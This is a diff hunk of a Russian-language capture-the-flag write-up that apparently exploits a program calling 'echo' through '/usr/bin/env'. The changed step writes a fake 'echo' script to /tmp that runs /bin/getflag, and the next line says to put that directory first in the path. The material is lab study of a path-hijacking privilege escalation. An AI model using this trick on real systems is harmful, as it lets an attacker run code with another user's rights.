@@ -30,10 +30,9 @@ system("/usr/bin/env echo Exploit me"Exploit me\
 
 Создаем файл echo с необходимым содержимым
 ```
-cat echo
+echo '#!/bin/sh
+> /bin/getflag' > /tmp/echo
 ```
-> #!/bin/sh\
-/bin/getflag
 
 Добавляем в начало данный путь
 ```
